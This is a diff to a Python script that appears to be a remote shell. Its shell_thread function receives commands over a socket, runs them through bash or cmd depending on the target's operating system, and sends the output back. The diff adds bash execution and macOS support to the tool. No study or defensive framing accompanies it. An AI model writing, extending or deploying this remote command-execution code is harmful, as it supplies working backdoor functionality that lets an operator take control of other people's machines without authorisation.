@@ -14,11 +14,14 @@ MAX_BUFFER = 4096
 
 def execute_bash(bash):
     try:
-        output = subprocess.check_output("bash {}".format(bash),
-            stderr=subprocess.STDOUT)
-    except:
-        output = b"Command Failed!"
+        process = subprocess.Popen(["bash", "-c", bash], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output, error = process.communicate()
+        if error:
+            output = error
+    except Exception as e:
+        output = b"Command Failed! " + str(e).encode('utf-8')
     return output
+
 
 
 def execute_cmd(cmd):
@@ -51,7 +54,10 @@ def shell_thread(s):
                     exit()
 
             print("> Executing Command: '{}'".format(buffer))
-            s.send(execute_cmd(buffer))
+            if 'macOS' in os:
+                s.send(execute_bash(buffer))
+            elif 'Windows' in os:
+                s.send(execute_cmd(buffer))
 
     except:
         s.close()
